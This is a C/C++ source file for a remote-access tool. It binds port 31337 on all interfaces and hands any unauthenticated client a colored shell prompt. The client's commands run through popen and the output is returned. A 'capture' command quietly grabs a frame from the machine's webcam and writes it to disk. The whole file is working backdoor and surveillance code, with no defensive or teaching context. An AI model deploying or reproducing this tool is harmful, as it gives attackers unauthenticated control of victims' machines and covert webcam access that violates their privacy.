/*
 * rion@c0d3r
 * here, take my dirty code
 */


#include <stdio.h>  //Standard i/
#include <unistd.h> //Write & Read & chdir & required by USER HOME
#include <netinet/in.h> //Main socket function
#include <string.h> //memset
#include <stdlib.h> //atoi
#include <errno.h>  //strerror & errno
#include <dirent.h> //checking directory for replacing ls command
/**USER HOME**/
#include <pwd.h>
#include <sys/types.h>
/*************/
/*Camera Function*/
#include "cv.h"
#include "highgui.h"
/*****************/

using namespace cv;

#define MB 1024*1024

void execute(const char *cmd, char *buffer);
void sendpath(const char *shell, char *path, char *shellpath, int fd);
void checkdir(const char *path, int fd);
const char *usrhome();
int capture(const char *path);

int main()
{
    int sockfd, newsockfd, port;
    socklen_t client_len;
    char cmd[MB], buffer[MB];
    char shell[] =  "\033[0;31m["               //Red
                    "\033[0;32mrion"            //Green
                    "\033[1;33m@"               //Yellow
                    "\033[1;34mc0d3r"           //Light Blue
                    "\033[0;31m]"               //Red
                    "\033[0;32m-";              //Green
    char path[512], shellpath[512], dir[256];
    char errors[MB];
    struct sockaddr_in serv_addr, client_addr;
    int opt = 1;
    memset(path, '\0', 512);
    memset(dir, '\0', 256);

    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));        //reuse socket

    if(!sockfd)
        return 1;
    puts("success creating socket");

    memset(&serv_addr, '\0', sizeof(serv_addr));                            //zero all for deleting all unexpected chars
    port = 31337;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    if(bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)
    {
        perror("Error Binding");
        exit(2);
    }
    puts("success binding");

    listen(sockfd, 3);      //Listen for 1 connection

    client_len = sizeof(client_addr);
    newsockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);

    if(newsockfd < 0)
        return 3;
    puts("success accept");
    memset(cmd,'\0', MB);
    sendpath(shell, path, shellpath, newsockfd);

    while((read(newsockfd, cmd, MB)) != -1)
    {
        if(!strcmp(cmd, "close\n")){
                if(!write(newsockfd, "\nConnection End...\n", 20))
                    return 5;
                puts("connection ended");
                close(sockfd);          /*Close after connect,
                to avoid TIME_WAIT system socket close so we can use many time*/
                close(newsockfd);
                exit(0);
        }
        else if(!strncmp(cmd, "cd ", 3))
        {
            for(int i=3, j=0; i < (int)strlen(cmd)-1; ++i){      //remove \n
                dir[j] = cmd[i];
                ++j;
            }
            if(!strcmp(dir, "~") || !strcmp(dir, "~/"))
            {
                if(chdir(usrhome()) == -1){
                    snprintf(errors, (strlen(usrhome()) + strlen(strerror(errno)))+3,
                            "%s %s\n", usrhome(), strerror(errno));
                    write(newsockfd, errors, strlen(errors));
                }
            }
            else if(!strncmp(dir, "~/", 2))
            {
                for(int i=0; i < (int)strlen(dir); i++)
                    dir[i] = dir[i+2];                  //removing "~/"
                if(chdir(usrhome()) == -1){
                    snprintf(errors, (strlen(usrhome()) + strlen(strerror(errno)))+3,
                            "%s %s\n", usrhome(), strerror(errno));
                    write(newsockfd, errors, strlen(errors));
                }
                if(chdir(dir) == -1){
                    snprintf(errors, (strlen(dir) + strlen(strerror(errno)))+3,
                            "%s %s\n", dir, strerror(errno));
                    write(newsockfd, errors, strlen(errors));
                }
            }
            else
            {
                if(chdir(dir) == -1){
                    snprintf(errors, (strlen(dir) + strlen(strerror(errno)))+3,
                            "%s %s\n", dir, strerror(errno));
                    write(newsockfd, errors, strlen(errors));
                }
            }
            memset(dir, 0, 256);
        }
        else if(!strcmp(cmd, "dir\n"))
            checkdir(".", newsockfd);
        else if(!strcmp(cmd, "cls\n"))
            write(newsockfd, "\033c", 2);
        else if(!strncmp(cmd, "capture ", 8))
        {
            char path[256];
            memset(path, '\0', 256);
            for(int i=0; i < (int)strlen(cmd); ++i){
                if(cmd[i+8] == 0xA)         //remove \n
                    break;
                path[i] = cmd[i+8];         //remove "capture "
            }
            if(!capture(path)){
                char err_code[256];
                snprintf(err_code, strlen(strerror(errno))+19,
                        "%s, Error Code: %d\n",
                        strerror(errno), errno);
                write(newsockfd, err_code, strlen(err_code));
            }
        }
        else
        {
            execute(cmd, buffer);
            write(newsockfd, buffer, strlen(buffer));
            memset(buffer, 0, MB);
        }
        memset(cmd, '\0', MB);
        fflush(NULL);       //Avoid sending sendpath() before execute()
        sendpath(shell, path, shellpath, newsockfd);
    }
}

void execute(const char *cmd, char *buffer){
    char command[MB];
    snprintf(command,strlen(cmd), "%s ", cmd);
    FILE *fp = popen(command, "r");
    char tmp[MB];
    memset(tmp, '\0', MB);
    while(fgets(tmp, MB, fp)){
        strcat(buffer, tmp);
    }
    pclose(fp);
}

void sendpath(const char *shell, char *path, char *shellpath, int fd){
    getcwd(path, 512);
    snprintf(shellpath, 512,    "%s"
                                "\033[0;31m["           //Red
                                "\033[0;36m%s"          //Cyan
                                "\033[0;31m]"           //Red
                                "\033[1;36m~"           //Light Cyan
                                "\033[1;33m$"           //Yellow
                                "\033[0m", shell, path);
    write(fd, shellpath, strlen(shellpath));
}

void checkdir(const char *path, int fd)
{
    DIR * d = opendir(path);
    if(d==NULL) return;
    char out[MB];
    memset(out, 0, MB);
    struct dirent * dir;
    while ((dir = readdir(d)) != NULL)
    {
        if(dir->d_type != DT_DIR)
        {
            snprintf(out, strlen(dir->d_name)+13,           //File name + colour length
                    "\033[0;37m%s\033[0m\n",
                    dir->d_name);
            write(fd, out, strlen(out));
            fflush(NULL);
        }
        else if(dir->d_type == DT_DIR) // if it is a directory
        {
                snprintf(out, strlen(dir->d_name)+13,       //Dir name + colour length
                        "\033[0;32m%s\033[0m\n",
                        dir->d_name);
                write(fd, out, strlen(out));
                fflush(NULL);
        }
    }
        closedir(d);
}

const char *usrhome(){
    const char *home;
    if((home = getenv("HOME")) == NULL)
        home = getpwuid(getuid())->pw_dir;
    return home;
}

int capture(const char *path)
{
    VideoCapture captured(0);    //Default
    Mat img;
    captured >> img;
    return (imwrite(path, img));
}
